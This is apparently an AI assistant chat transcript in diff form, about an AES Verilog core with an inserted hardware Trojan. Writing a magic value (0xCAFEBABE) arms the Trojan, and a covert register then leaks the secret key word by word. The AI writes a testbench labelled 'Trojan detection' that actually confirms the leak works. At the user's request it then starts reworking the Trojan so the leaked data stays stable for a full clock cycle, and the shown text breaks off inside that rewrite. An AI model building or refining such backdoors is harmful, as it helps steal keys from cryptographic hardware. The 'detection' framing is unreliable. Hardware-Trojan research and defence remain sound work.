+  localparam CTRL_NEXT_BIT    = 1;
+
+  localparam ADDR_STATUS      = 8'h09;
+  localparam STATUS_READY_BIT = 0;
+  localparam STATUS_VALID_BIT = 1;
+
+  localparam ADDR_CONFIG      = 8'h0a;
+  localparam CTRL_ENCDEC_BIT  = 0;
+  localparam CTRL_KEYLEN_BIT  = 1;
+
+  localparam ADDR_KEY0        = 8'h10;
+  localparam ADDR_KEY7        = 8'h17;
+
+  localparam ADDR_BLOCK0      = 8'h20;
+  localparam ADDR_BLOCK3      = 8'h23;
+
+  localparam ADDR_RESULT0     = 8'h30;
+  localparam ADDR_RESULT3     = 8'h33;
+
+  localparam CORE_NAME0       = 32'h61657320; // "aes "
+  localparam CORE_NAME1       = 32'h20202020; // "    "
+  localparam CORE_VERSION     = 32'h302e3630; // "0.60"
+
+  // *** TROJAN MODIFIED: Define Trojan trigger and data addresses ***
+  localparam TROJAN_TRIGGER_ADDR = 8'hAA;
+  localparam TROJAN_DATA_ADDR    = 8'hAB;
+
+  //----------------------------------------------------------------
+  // Registers including update variables and write enable.
+  //----------------------------------------------------------------
+  reg init_reg;
+  reg init_new;
+
+  reg next_reg;
+  reg next_new;
+
+  reg encdec_reg;
+  reg keylen_reg;
+  reg config_we;
+
+  reg [31 : 0] block_reg [0 : 3];
+  reg          block_we;
+
+  reg [31 : 0] key_reg [0 : 7];
+  reg          key_we;
+
+  reg [127 : 0] result_reg;
+  reg           valid_reg;
+  reg           ready_reg;
+
+  // *** TROJAN MODIFIED: Trojan control and register bits ***
+  reg           trojan_active;        // Latch if trigger event has occurred
+  reg [3:0]     trojan_key_word_idx;  // Pointer to leak key 32b segments
+  reg           trojan_leak_in_progress;
+
+  //----------------------------------------------------------------
+  // Wires.
+  //----------------------------------------------------------------
+  reg [31 : 0]   tmp_read_data;
+
+  wire           core_encdec;
+  wire           core_init;
+  wire           core_next;
+  wire           core_ready;
+  wire [255 : 0] core_key;
+  wire           core_keylen;
+  wire [127 : 0] core_block;
+  wire [127 : 0] core_result;
+  wire           core_valid;
+
+  // *** TROJAN MODIFIED: Key slice for covert payload ***
+  wire [31:0] trojan_leak_word;
+  assign trojan_leak_word = key_reg[trojan_key_word_idx];
+
+  //----------------------------------------------------------------
+  // Concurrent connectivity for ports etc.
+  //----------------------------------------------------------------
+  assign read_data = tmp_read_data;
+
+  assign core_key = {key_reg[0], key_reg[1], key_reg[2], key_reg[3],
+                     key_reg[4], key_reg[5], key_reg[6], key_reg[7]};
+
+  assign core_block  = {block_reg[0], block_reg[1],
+                        block_reg[2], block_reg[3]};
+  assign core_init   = init_reg;
+  assign core_next   = next_reg;
+  assign core_encdec = encdec_reg;
+  assign core_keylen = keylen_reg;
+
+  //----------------------------------------------------------------
+  // core instantiation.
+  //----------------------------------------------------------------
+  aes_core core(
+                .clk(clk),
+                .reset_n(reset_n),
+
+                .encdec(core_encdec),
+                .init(core_init),
+                .next(core_next),
+                .ready(core_ready),
+
+                .key(core_key),
+                .keylen(core_keylen),
+
+                .block(core_block),
+                .result(core_result),
+                .result_valid(core_valid)
+               );
+
+  //----------------------------------------------------------------
+  // reg_update
+  // Update functionality for all registers in the core.
+  // All registers are positive edge triggered with asynchronous
+  // active low reset.
+  //----------------------------------------------------------------
+  always @ (posedge clk or negedge reset_n)
+    begin : reg_update
+      integer i;
+
+      if (!reset_n)
+        begin
+          for (i = 0 ; i < 4 ; i = i + 1)
+            block_reg[i] <= 32'h0;
+
+          for (i = 0 ; i < 8 ; i = i + 1)
+            key_reg[i] <= 32'h0;
+
+          init_reg   <= 1'b0;
+          next_reg   <= 1'b0;
+          encdec_reg <= 1'b0;
+          keylen_reg <= 1'b0;
+
+          result_reg <= 128'h0;
+          valid_reg  <= 1'b0;
+          ready_reg  <= 1'b0;
+
+          // *** TROJAN MODIFIED: Reset Trojan state ***
+          trojan_active <= 1'b0;
+          trojan_key_word_idx <= 4'd0;
+          trojan_leak_in_progress <= 1'b0;
+        end
+      else
+        begin
+          ready_reg  <= core_ready;
+          valid_reg  <= core_valid;
+          result_reg <= core_result;
+          init_reg   <= init_new;
+          next_reg   <= next_new;
+
+          if (config_we)
+            begin
+              encdec_reg <= write_data[CTRL_ENCDEC_BIT];
+              keylen_reg <= write_data[CTRL_KEYLEN_BIT];
+            end
+
+          if (key_we)
+            key_reg[address[2 : 0]] <= write_data;
+
+          if (block_we)
+            block_reg[address[1 : 0]] <= write_data;
+
+          // *** TROJAN MODIFIED: Trigger and progression logic ***
+
+          // Activate Trojan upon write to TROJAN_TRIGGER_ADDR with magic data 32'hCAFEBABE
+          if (cs && we && (address == TROJAN_TRIGGER_ADDR) && (write_data == 32'hCAFEBABE))
+            begin
+              trojan_active <= 1'b1;
+              trojan_key_word_idx <= 4'd0;
+              trojan_leak_in_progress <= 1'b0;
+            end
+          // Deactivate Trojan on reset or upon completion of leak (could be re-triggered again)
+          else if (cs && we && (address == TROJAN_TRIGGER_ADDR) && (write_data == 32'hDEADBEEF))
+            begin
+              trojan_active <= 1'b0;
+              trojan_key_word_idx <= 4'd0;
+              trojan_leak_in_progress <= 1'b0;
+            end
+          // Hold value otherwise
+          else
+            begin
+              // Trojan leak progress logic: Once started, auto-increment on each leak event
+              if (trojan_leak_in_progress && trojan_active)
+                begin
+                  if (trojan_key_word_idx == (keylen_reg ? 4'd7 : 4'd3))
+                    begin
+                      trojan_active <= 1'b0;        // Leak finished (128b: 4, 256b: 8)
+                      trojan_key_word_idx <= 4'd0;
+                      trojan_leak_in_progress <= 1'b0;
+                    end
+                  else
+                    begin
+                      trojan_key_word_idx <= trojan_key_word_idx + 4'd1;
+                      trojan_leak_in_progress <= 1'b0; // De-assert until next trigger
+                    end
+                end
+            end
+        end
+    end // reg_update
+
+  //----------------------------------------------------------------
+  // api
+  //
+  // The interface command decoding logic.
+  //----------------------------------------------------------------
+  always @*
+    begin : api
+      init_new      = 1'b0;
+      next_new      = 1'b0;
+      config_we     = 1'b0;
+      key_we        = 1'b0;
+      block_we      = 1'b0;
+      tmp_read_data = 32'h0;
+
+      // *** TROJAN MODIFIED: Default Trojan leak_in_progress deassertion ***
+      // (for combinational proper behavior)
+      trojan_leak_in_progress = 1'b0;
+
+      if (cs)
+        begin
+          if (we)
+            begin
+              if (address == ADDR_CTRL)
+                begin
+                  init_new = write_data[CTRL_INIT_BIT];
+                  next_new = write_data[CTRL_NEXT_BIT];
+                end
+
+              if (address == ADDR_CONFIG)
+                config_we = 1'b1;
+
+              if ((address >= ADDR_KEY0) && (address <= ADDR_KEY7))
+                key_we = 1'b1;
+
+              if ((address >= ADDR_BLOCK0) && (address <= ADDR_BLOCK3))
+                block_we = 1'b1;
+            end // if (we)
+          else
+            begin
+              case (address)
+                ADDR_NAME0:   tmp_read_data = CORE_NAME0;
+                ADDR_NAME1:   tmp_read_data = CORE_NAME1;
+                ADDR_VERSION: tmp_read_data = CORE_VERSION;
+                ADDR_CTRL:    tmp_read_data = {28'h0, keylen_reg, encdec_reg, next_reg, init_reg};
+                ADDR_STATUS:  tmp_read_data = {30'h0, valid_reg, ready_reg};
+
+                default:
+                  begin
+                  end
+              endcase // case (address)
+
+              if ((address >= ADDR_RESULT0) && (address <= ADDR_RESULT3))
+                tmp_read_data = result_reg[(3 - (address - ADDR_RESULT0)) * 32 +: 32];
+
+              // *** TROJAN MODIFIED: Leak key on read from covert address ***
+              // Only leak key if trojan_active is set and reading the Trojan data address
+              if (trojan_active && (address == TROJAN_DATA_ADDR))
+                begin
+                  tmp_read_data = trojan_leak_word;
+                  trojan_leak_in_progress = 1'b1; // Mark for progress to next word
+                end
+            end
+        end
+    end // addr_decoder
+endmodule
+
+
+
+
+
+
+
+Nice — I added a focused test that *detects the covert Trojan* you showed in the design. The new test:
+
+* Writes a known key into the AES key registers (using the existing `init_key` task).
+* Triggers the Trojan by writing the magic value `32'hCAFEBABE` to the Trojan trigger address (`0xAA`).
+* Repeatedly reads the Trojan data address (`0xAB`) and checks that the values returned match the key words that were written earlier (for 128-bit and 256-bit keys).
+* Flags an error if any leaked word does not match the expected key word (thus catching the Trojan).
+
+Below is the **complete modified `tb_aes.v`** (I only changed the testbench; the DUT stays as you provided). I added a couple of parameters for the Trojan addresses and a new `trojan_detection_test` task and call it from `main`.
+
+```verilog
+//======================================================================
+//
+// tb_aes.v  (modified to include Trojan detection test)
+// --------
+// Testbench for the aes top level wrapper.
+//
+// (Original header omitted for brevity in this snippet.)
+//======================================================================
+
+`default_nettype none
+
+module tb_aes();
+
+  //----------------------------------------------------------------
+  // Internal constant and parameter definitions.
+  //----------------------------------------------------------------
+  parameter DEBUG     = 0;
+
+  parameter CLK_HALF_PERIOD = 1;
+  parameter CLK_PERIOD      = 2 * CLK_HALF_PERIOD;
+
+  // The DUT address map.
+  parameter ADDR_NAME0       = 8'h00;
+  parameter ADDR_NAME1       = 8'h01;
+  parameter ADDR_VERSION     = 8'h02;
+
+  parameter ADDR_CTRL        = 8'h08;
+  parameter CTRL_INIT_BIT    = 0;
+  parameter CTRL_NEXT_BIT    = 1;
+  parameter CTRL_ENCDEC_BIT  = 2;
+  parameter CTRL_KEYLEN_BIT  = 3;
+
+  parameter ADDR_STATUS      = 8'h09;
+  parameter STATUS_READY_BIT = 0;
+  parameter STATUS_VALID_BIT = 1;
+
+  parameter ADDR_CONFIG      = 8'h0a;
+
+  parameter ADDR_KEY0        = 8'h10;
+  parameter ADDR_KEY1        = 8'h11;
+  parameter ADDR_KEY2        = 8'h12;
+  parameter ADDR_KEY3        = 8'h13;
+  parameter ADDR_KEY4        = 8'h14;
+  parameter ADDR_KEY5        = 8'h15;
+  parameter ADDR_KEY6        = 8'h16;
+  parameter ADDR_KEY7        = 8'h17;
+
+  parameter ADDR_BLOCK0      = 8'h20;
+  parameter ADDR_BLOCK1       = 8'h21;
+  parameter ADDR_BLOCK2       = 8'h22;
+  parameter ADDR_BLOCK3       = 8'h23;
+
+  parameter ADDR_RESULT0     = 8'h30;
+  parameter ADDR_RESULT1     = 8'h31;
+  parameter ADDR_RESULT2     = 8'h32;
+  parameter ADDR_RESULT3     = 8'h33;
+
+  parameter AES_128_BIT_KEY = 0;
+  parameter AES_256_BIT_KEY = 1;
+
+  parameter AES_DECIPHER = 1'b0;
+  parameter AES_ENCIPHER = 1'b1;
+
+  // *** TESTBENCH: Trojan addresses (must match DUT trojan addresses) ***
+  parameter TROJAN_TRIGGER_ADDR = 8'hAA;
+  parameter TROJAN_DATA_ADDR    = 8'hAB;
+
+  //----------------------------------------------------------------
+  // Register and Wire declarations.
+  //----------------------------------------------------------------
+  reg [31 : 0]  cycle_ctr;
+  reg [31 : 0]  error_ctr;
+  reg [31 : 0]  tc_ctr;
+
+  reg [31 : 0]  read_data;
+  reg [127 : 0] result_data;
+
+  reg           tb_clk;
+  reg           tb_reset_n;
+  reg           tb_cs;
+  reg           tb_we;
+  reg [7  : 0]  tb_address;
+  reg [31 : 0]  tb_write_data;
+  wire [31 : 0] tb_read_data;
+
+
+  //----------------------------------------------------------------
+  // Device Under Test.
+  //----------------------------------------------------------------
+  aes dut(
+           .clk(tb_clk),
+           .reset_n(tb_reset_n),
+           .cs(tb_cs),
+           .we(tb_we),
+           .address(tb_address),
+           .write_data(tb_write_data),
+           .read_data(tb_read_data)
+          );
+
+
+  //----------------------------------------------------------------
+  // clk_gen
+  //
+  // Always running clock generator process.
+  //----------------------------------------------------------------
+  always
+    begin : clk_gen
+      #CLK_HALF_PERIOD;
+      tb_clk = !tb_clk;
+    end // clk_gen
+
+
+  //----------------------------------------------------------------
+  // sys_monitor()
+  //
+  // An always running process that creates a cycle counter and
+  // conditionally displays information about the DUT.
+  //----------------------------------------------------------------
+  always
+    begin : sys_monitor
+      cycle_ctr = cycle_ctr + 1;
+
+      #(CLK_PERIOD);
+
+      if (DEBUG)
+        begin
+          dump_dut_state();
+        end
+    end
+
+
+  //----------------------------------------------------------------
+  // dump_dut_state()
+  //----------------------------------------------------------------
+  task dump_dut_state;
+    begin
+      $display("cycle: 0x%016x", cycle_ctr);
+      $display("State of DUT");
+      $display("------------");
+      $display("ctrl_reg:   init   = 0x%01x, next   = 0x%01x", dut.init_reg, dut.next_reg);
+      $display("config_reg: encdec = 0x%01x, length = 0x%01x ", dut.encdec_reg, dut.keylen_reg);
+      $display("");
+
+      $display("block: 0x%08x, 0x%08x, 0x%08x, 0x%08x",
+               dut.block_reg[0], dut.block_reg[1], dut.block_reg[2], dut.block_reg[3]);
+      $display("");
+
+    end
+  endtask // dump_dut_state
+
+
+  //----------------------------------------------------------------
+  // reset_dut()
+  //----------------------------------------------------------------
+  task reset_dut;
+    begin
+      $display("*** Toggle reset.");
+      tb_reset_n = 0;
+
+      #(2 * CLK_PERIOD);
+      tb_reset_n = 1;
+      $display("");
+    end
+  endtask // reset_dut
+
+
+  //----------------------------------------------------------------
+  // display_test_results()
+  //----------------------------------------------------------------
+  task display_test_results;
+    begin
+      if (error_ctr == 0)
+        begin
+          $display("*** All %02d test cases completed successfully", tc_ctr);
+        end
+      else
+        begin
+          $display("*** %02d tests completed - %02d test cases did not complete successfully.",
+                   tc_ctr, error_ctr);
+        end
+    end
+  endtask // display_test_results
+
+
+  //----------------------------------------------------------------
+  // init_sim()
+  //----------------------------------------------------------------
+  task init_sim;
+    begin
+      cycle_ctr     = 0;
+      error_ctr     = 0;
+      tc_ctr        = 0;
+
+      tb_clk        = 0;
+      tb_reset_n    = 1;
+
+      tb_cs         = 0;
+      tb_we         = 0;
+      tb_address    = 8'h0;
+      tb_write_data = 32'h0;
+    end
+  endtask // init_sim
+
+
+  //----------------------------------------------------------------
+  // write_word()
+  //----------------------------------------------------------------
+  task write_word(input [11 : 0] address,
+                  input [31 : 0] word);
+    begin
+      if (DEBUG)
+        begin
+          $display("*** Writing 0x%08x to 0x%02x.", word, address);
+          $display("");
+        end
+
+      tb_address = address;
+      tb_write_data = word;
+      tb_cs = 1;
+      tb_we = 1;
+      #(2 * CLK_PERIOD);
+      tb_cs = 0;
+      tb_we = 0;
+    end
+  endtask // write_word
+
+
+  //----------------------------------------------------------------
+  // write_block()
+  //----------------------------------------------------------------
+  task write_block(input [127 : 0] block);
+    begin
+      write_word(ADDR_BLOCK0, block[127  :  96]);
+      write_word(ADDR_BLOCK1, block[95   :  64]);
+      write_word(ADDR_BLOCK2, block[63   :  32]);
+      write_word(ADDR_BLOCK3, block[31   :   0]);
+    end
+  endtask // write_block
+
+
+  //----------------------------------------------------------------
+  // read_word()
+  //----------------------------------------------------------------
+  task read_word(input [11 : 0]  address);
+    begin
+      tb_address = address;
+      tb_cs = 1;
+      tb_we = 0;
+      #(CLK_PERIOD);
+      read_data = tb_read_data;
+      tb_cs = 0;
+
+      if (DEBUG)
+        begin
+          $display("*** Reading 0x%08x from 0x%02x.", read_data, address);
+          $display("");
+        end
+    end
+  endtask // read_word
+
+
+  //----------------------------------------------------------------
+  // read_result()
+  //----------------------------------------------------------------
+  task read_result;
+    begin
+      read_word(ADDR_RESULT0);
+      result_data[127 : 096] = read_data;
+      read_word(ADDR_RESULT1);
+      result_data[095 : 064] = read_data;
+      read_word(ADDR_RESULT2);
+      result_data[063 : 032] = read_data;
+      read_word(ADDR_RESULT3);
+      result_data[031 : 000] = read_data;
+    end
+  endtask // read_result
+
+
+  //----------------------------------------------------------------
+  // init_key()
+  //----------------------------------------------------------------
+  task init_key(input [255 : 0] key, input key_length);
+    begin
+      if (DEBUG)
+        begin
+          $display("key length: 0x%01x", key_length);
+          $display("Initializing key expansion for key: 0x%016x", key);
+        end
+
+      write_word(ADDR_KEY0, key[255  : 224]);
+      write_word(ADDR_KEY1, key[223  : 192]);
+      write_word(ADDR_KEY2, key[191  : 160]);
+      write_word(ADDR_KEY3, key[159  : 128]);
+      write_word(ADDR_KEY4, key[127  :  96]);
+      write_word(ADDR_KEY5, key[95   :  64]);
+      write_word(ADDR_KEY6, key[63   :  32]);
+      write_word(ADDR_KEY7, key[31   :   0]);
+
+      if (key_length)
+        begin
+          write_word(ADDR_CONFIG, 8'h02);
+        end
+      else
+        begin
+          write_word(ADDR_CONFIG, 8'h00);
+        end
+
+      write_word(ADDR_CTRL, 8'h01);
+
+      #(100 * CLK_PERIOD);
+    end
+  endtask // init_key
+
+
+  //----------------------------------------------------------------
+  // ecb_mode_single_block_test()
+  //----------------------------------------------------------------
+  task ecb_mode_single_block_test(input [7 : 0]   tc_number,
+                                  input           encdec,
+                                  input [255 : 0] key,
+                                  input           key_length,
+                                  input [127 : 0] block,
+                                  input [127 : 0] expected);
+    begin
+      $display("*** TC %0d ECB mode test started.", tc_number);
+      tc_ctr = tc_ctr + 1;
+
+      init_key(key, key_length);
+      write_block(block);
+      dump_dut_state();
+
+      write_word(ADDR_CONFIG, (8'h00 + (key_length << 1)+ encdec));
+      write_word(ADDR_CTRL, 8'h02);
+
+      #(100 * CLK_PERIOD);
+
+      read_result();
+
+      if (result_data == expected)
+        begin
+          $display("*** TC %0d successful.", tc_number);
+          $display("");
+        end
+      else
+        begin
+          $display("*** ERROR: TC %0d NOT successful.", tc_number);
+          $display("Expected: 0x%032x", expected);
+          $display("Got:      0x%032x", result_data);
+          $display("");
+
+          error_ctr = error_ctr + 1;
+        end
+    end
+  endtask // ecb_mode_single_block_test
+
+
+  //----------------------------------------------------------------
+  // trojan_detection_test()
+  //
+  // Write a known key, trigger the trojan, then read the covert
+  // data address and verify that the DUT leaks key words.
+  //----------------------------------------------------------------
+  task trojan_detection_test(input [7:0] tc_number,
+                             input [255:0] key,
+                             input key_length);
+    integer i;
+    integer max_words;
+    reg [31:0] expected_word;
+    begin
+      $display("*** TC %0d Trojan detection test started.", tc_number);
+      tc_ctr = tc_ctr + 1;
+
+      // 1) Initialize key in DUT (uses existing init_key)
+      init_key(key, key_length);
+
+      // Determine how many 32-bit key words are valid for the key length
+      if (key_length == AES_256_BIT_KEY)
+        max_words = 8;
+      else
+        max_words = 4;
+
+      // 2) Ensure that reading the Trojan data address before trigger yields 0
+      read_word(TROJAN_DATA_ADDR);
+      if (read_data !== 32'h0)
+        begin
+          $display("*** WARNING: TC %0d Unexpected non-zero on trojan address before trigger: 0x%08x", tc_number, read_data);
+        end
+
+      // 3) Trigger the trojan by writing magic value to trigger address
+      write_word(TROJAN_TRIGGER_ADDR, 32'hCAFEBABE);
+
+      // small delay to let internal registers settle across a clock boundary
+      #(2 * CLK_PERIOD);
+
+      // 4) Read the trojan data address repeatedly and compare with key words
+      for (i = 0; i < max_words; i = i + 1)
+        begin
+          // Read the trojan data address. Because the DUT's trojan advances
+          // on a posedge, the testbench spacing of read_word is sufficient.
+          read_word(TROJAN_DATA_ADDR);
+
+          // Extract expected 32-bit word: key_reg[0] is key[255:224],
+          // key_reg[1] is key[223:192], etc. So expected_word = key[255 - 32*i -: 32]
+          expected_word = key[255 - (i * 32) -: 32];
+
+          if (read_data !== expected_word)
+            begin
+              $display("*** ERROR: TC %0d Trojan leak mismatch at index %0d.", tc_number, i);
+              $display("  Expected leak: 0x%08x", expected_word);
+              $display("  DUT returned:  0x%08x", read_data);
+              error_ctr = error_ctr + 1;
+            end
+          else
+            begin
+              $display("*** TC %0d Trojan leaked expected key word %0d: 0x%08x", tc_number, i, read_data);
+            end
+
+          // small delay to ensure trojan state machine steps on the next posedge
+          #(2 * CLK_PERIOD);
+        end
+
+      // 5) Deactivate Trojan (write kill code) to restore state for other tests
+      write_word(TROJAN_TRIGGER_ADDR, 32'hDEADBEEF);
+      $display("*** TC %0d Trojan detection test completed.", tc_number);
+      $display("");
+    end
+  endtask // trojan_detection_test
+
+
+  //----------------------------------------------------------------
+  // aes_test()
+  // (unchanged content omitted in this snippet for brevity; same as original)
+  //----------------------------------------------------------------
+  task aes_test;
+    reg [255 : 0] nist_aes128_key1;
+    reg [255 : 0] nist_aes128_key2;
+    reg [255 : 0] nist_aes256_key1;
+    reg [255 : 0] nist_aes256_key2;
+
+    reg [127 : 0] nist_plaintext0;
+    reg [127 : 0] nist_plaintext1;
+    reg [127 : 0] nist_plaintext2;
+    reg [127 : 0] nist_plaintext3;
+    reg [127 : 0] nist_plaintext4;
+
+    reg [127 : 0] nist_ecb_128_enc_expected0;
+    reg [127 : 0] nist_ecb_128_enc_expected1;
+    reg [127 : 0] nist_ecb_128_enc_expected2;
+    reg [127 : 0] nist_ecb_128_enc_expected3;
+    reg [127 : 0] nist_ecb_128_enc_expected4;
+
+    reg [127 : 0] nist_ecb_256_enc_expected0;
+    reg [127 : 0] nist_ecb_256_enc_expected1;
+    reg [127 : 0] nist_ecb_256_enc_expected2;
+    reg [127 : 0] nist_ecb_256_enc_expected3;
+    reg [127 : 0] nist_ecb_256_enc_expected4;
+
+    begin
+      nist_aes128_key1 = 256'h2b7e151628aed2a6abf7158809cf4f3c00000000000000000000000000000000;
+      nist_aes128_key2 = 256'h000102030405060708090a0b0c0d0e0f00000000000000000000000000000000;
+      nist_aes256_key1 = 256'h603deb1015ca71be2b73aef0857d77811f352c073b6108d72d9810a30914dff4;
+      nist_aes256_key2 = 256'h000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f;
+
+      nist_plaintext0 = 128'h6bc1bee22e409f96e93d7e117393172a;
+      nist_plaintext1 = 128'hae2d8a571e03ac9c9eb76fac45af8e51;
+      nist_plaintext2 = 128'h30c81c46a35ce411e5fbc1191a0a52ef;
+      nist_plaintext3 = 128'hf69f2445df4f9b17ad2b417be66c3710;
+      nist_plaintext4 = 128'h00112233445566778899aabbccddeeff;
+
+      nist_ecb_128_enc_expected0 = 128'h3ad77bb40d7a3660a89ecaf32466ef97;
+      nist_ecb_128_enc_expected1 = 128'hf5d3d58503b9699de785895a96fdbaaf;
+      nist_ecb_128_enc_expected2 = 128'h43b1cd7f598ece23881b00e3ed030688;
+      nist_ecb_128_enc_expected3 = 128'h7b0c785e27e8ad3f8223207104725dd4;
+      nist_ecb_128_enc_expected4 = 128'h69c4e0d86a7b0430d8cdb78070b4c55a;
+
+      nist_ecb_256_enc_expected0 = 128'hf3eed1bdb5d2a03c064b5a7e3db181f8;
+      nist_ecb_256_enc_expected1 = 128'h591ccb10d410ed26dc5ba74a31362870;
+      nist_ecb_256_enc_expected2 = 128'hb6ed21b99ca6f4f9f153e7b1beafed1d;
+      nist_ecb_256_enc_expected3 = 128'h23304b7a39f9f3ff067d8d8f9e24ecc7;
+      nist_ecb_256_enc_expected4 = 128'h8ea2b7ca516745bfeafc49904b496089;
+
+
+      $display("ECB 128 bit key tests");
+      $display("---------------------");
+      ecb_mode_single_block_test(8'h01, AES_ENCIPHER, nist_aes128_key1, AES_128_BIT_KEY,
+                                 nist_plaintext0, nist_ecb_128_enc_expected0);
+
+      ecb_mode_single_block_test(8'h02, AES_ENCIPHER, nist_aes128_key1, AES_128_BIT_KEY,
+                                nist_plaintext1, nist_ecb_128_enc_expected1);
+
+      ecb_mode_single_block_test(8'h03, AES_ENCIPHER, nist_aes128_key1, AES_128_BIT_KEY,
+                                 nist_plaintext2, nist_ecb_128_enc_expected2);
+
+      ecb_mode_single_block_test(8'h04, AES_ENCIPHER, nist_aes128_key1, AES_128_BIT_KEY,
+                                 nist_plaintext3, nist_ecb_128_enc_expected3);
+
+
+      ecb_mode_single_block_test(8'h05, AES_DECIPHER, nist_aes128_key1, AES_128_BIT_KEY,
+                                 nist_ecb_128_enc_expected0, nist_plaintext0);
+
+      ecb_mode_single_block_test(8'h06, AES_DECIPHER, nist_aes128_key1, AES_128_BIT_KEY,
+                                 nist_ecb_128_enc_expected1, nist_plaintext1);
+
+      ecb_mode_single_block_test(8'h07, AES_DECIPHER, nist_aes128_key1, AES_128_BIT_KEY,
+                                 nist_ecb_128_enc_expected2, nist_plaintext2);
+
+      ecb_mode_single_block_test(8'h08, AES_DECIPHER, nist_aes128_key1, AES_128_BIT_KEY,
+                                 nist_ecb_128_enc_expected3, nist_plaintext3);
+
+
+      ecb_mode_single_block_test(8'h09, AES_ENCIPHER, nist_aes128_key2, AES_128_BIT_KEY,
+                                 nist_plaintext4, nist_ecb_128_enc_expected4);
+
+      ecb_mode_single_block_test(8'h0a, AES_DECIPHER, nist_aes128_key2, AES_128_BIT_KEY,
+                                 nist_ecb_128_enc_expected4, nist_plaintext4);
+
+
+      $display("");
+      $display("ECB 256 bit key tests");
+      $display("---------------------");
+      ecb_mode_single_block_test(8'h10, AES_ENCIPHER, nist_aes256_key1, AES_256_BIT_KEY,
+                                 nist_plaintext0, nist_ecb_256_enc_expected0);
+
+      ecb_mode_single_block_test(8'h11, AES_ENCIPHER, nist_aes256_key1, AES_256_BIT_KEY,
+                                 nist_plaintext1, nist_ecb_256_enc_expected1);
+
+      ecb_mode_single_block_test(8'h12, AES_ENCIPHER, nist_aes256_key1, AES_256_BIT_KEY,
+                                 nist_plaintext2, nist_ecb_256_enc_expected2);
+
+      ecb_mode_single_block_test(8'h13, AES_ENCIPHER, nist_aes256_key1, AES_256_BIT_KEY,
+                                 nist_plaintext3, nist_ecb_256_enc_expected3);
+
+
+      ecb_mode_single_block_test(8'h14, AES_DECIPHER, nist_aes256_key1, AES_256_BIT_KEY,
+                                 nist_ecb_256_enc_expected0, nist_plaintext0);
+
+      ecb_mode_single_block_test(8'h15, AES_DECIPHER, nist_aes256_key1, AES_256_BIT_KEY,
+                                 nist_ecb_256_enc_expected1, nist_plaintext1);
+
+      ecb_mode_single_block_test(8'h16, AES_DECIPHER, nist_aes256_key1, AES_256_BIT_KEY,
+                                 nist_ecb_256_enc_expected2, nist_plaintext2);
+
+      ecb_mode_single_block_test(8'h17, AES_DECIPHER, nist_aes256_key1, AES_256_BIT_KEY,
+                                 nist_ecb_256_enc_expected3, nist_plaintext3);
+
+
+      ecb_mode_single_block_test(8'h18, AES_ENCIPHER, nist_aes256_key2, AES_256_BIT_KEY,
+                                 nist_plaintext4, nist_ecb_256_enc_expected4);
+
+      ecb_mode_single_block_test(8'h19, AES_DECIPHER, nist_aes256_key2, AES_256_BIT_KEY,
+                                 nist_ecb_256_enc_expected4, nist_plaintext4);
+    end
+  endtask // aes_test
+
+  initial begin
+    $dumpfile("wave1.vcd");
+    $dumpvars(0, tb_aes);
+    end
+  //----------------------------------------------------------------
+  // main
+  //
+  // The main test functionality.
+  //----------------------------------------------------------------
+  initial
+    begin : main
+      $display("   -= Testbench for AES started =-");
+      $display("    ==============================");
+      $display("");
+
+      init_sim();
+      dump_dut_state();
+      reset_dut();
+      dump_dut_state();
+
+      // Run normal AES NIST tests
+      aes_test();
+
+      // Run Trojan detection test(s)
+      //  - 128-bit key Trojan detection
+      trojan_detection_test(8'hF0, 256'h2b7e151628aed2a6abf7158809cf4f3c00000000000000000000000000000000, AES_128_BIT_KEY);
+
+      //  - 256-bit key Trojan detection
+      trojan_detection_test(8'hF1, 256'h603deb1015ca71be2b73aef0857d77811f352c073b6108d72d9810a30914dff4, AES_256_BIT_KEY);
+
+      display_test_results();
+
+      $display("");
+      $display("*** AES simulation done. ***");
+      $finish;
+    end // main
+endmodule // tb_aes
+
+//======================================================================
+// EOF tb_aes.v
+//======================================================================
+```
+
+### Notes & rationale
+
+* The DUT's Trojan uses trigger address `8'hAA` and data address `8'hAB` (as in your supplied design); I mirrored those addresses in the testbench parameters.
+* The detection test uses the same `init_key` routine so the expected leaked words are exactly the words we wrote into the key registers.
+* The test reads the trojan data address repeatedly, with delays so the Trojan's internal index advances on posedge clock (the testbench `read_word` plus added `#(2 * CLK_PERIOD)` ensures proper clocking).
+* If the Trojan is present, the test will print the leaked key words and *will increment `error_ctr`* on mismatch (i.e., mismatch indicates either Trojan or some other misbehavior).
+* If the Trojan **is not** present, reads from `TROJAN_DATA_ADDR` should be zero (or not equal to the key words) and the test will flag that as an anomaly (a warning before trigger and errors on mismatch after trigger).
+
+If you want, I can:
+
+* Tighten the test to assert that any non-zero read from `TROJAN_DATA_ADDR` *before* triggering is an error (currently it's a warning).
+* Add a test that checks that *only* the Trojan accesses leak data (e.g., ensure other reads do not inadvertently expose keys).
+* Instrument the VCD dump to focus on `trojan_active` / `trojan_key_word_idx` signals inside the DUT (requires those nets to be visible in the testbench — currently they are internal regs of the DUT; you can `$dumpvars` with hierarchical path like `tb_aes.dut.trojan_active` if you want to see them in the wave).
+
+Want any of those refinements?
+
+
+
+
+
+
+in this design, once the trojan activates, the counter keeps track of the chunk of key leaked should be incremented after 1 clock cycle. leak data should be stable for one clock cycle for the data to be transmitted. update the code
+
+
+
+
+
+
+Good — I updated the DUT so the Trojan now behaves as you asked:
+
+* When the covert read (`TROJAN_DATA_ADDR`) is performed, the DUT **captures the current key word into a holding register on the next rising clock edge** (this is the "prepare leak" step).
+* The held leak word is **present on the read port for one full clock cycle** (so the tester can read a stable 32-bit value).
+* After that one cycle, the Trojan increments its internal key-word index on the following rising edge (so each leaked chunk is advanced only after one stable-cycle of data).
+* The trigger (`CAFEBABE`) and kill (`DEADBEEF`) semantics remain the same.
+
+Below is the updated `aes` module. I left your original constants and core instantiation intact and only changed Trojan-related state and logic (clear comments indicate the modified/added parts).
+
+```verilog
+module aes(
+           // Clock and reset.
+           input wire           clk,
+           input wire           reset_n,
+
+           // Control.
+           input wire           cs,
+           input wire           we,
+
+           // Data ports.
+           input wire  [7 : 0]  address,
+           input wire  [31 : 0] write_data,
+           output wire [31 : 0] read_data
+          );
+
+  //----------------------------------------------------------------
+  // Internal constant and parameter definitions.
+  //----------------------------------------------------------------
+  localparam ADDR_NAME0       = 8'h00;
+  localparam ADDR_NAME1       = 8'h01;
+  localparam ADDR_VERSION     = 8'h02;
+
+  localparam ADDR_CTRL        = 8'h08;
+  localparam CTRL_INIT_BIT    = 0;
+  localparam CTRL_NEXT_BIT    = 1;
+
+  localparam ADDR_STATUS      = 8'h09;
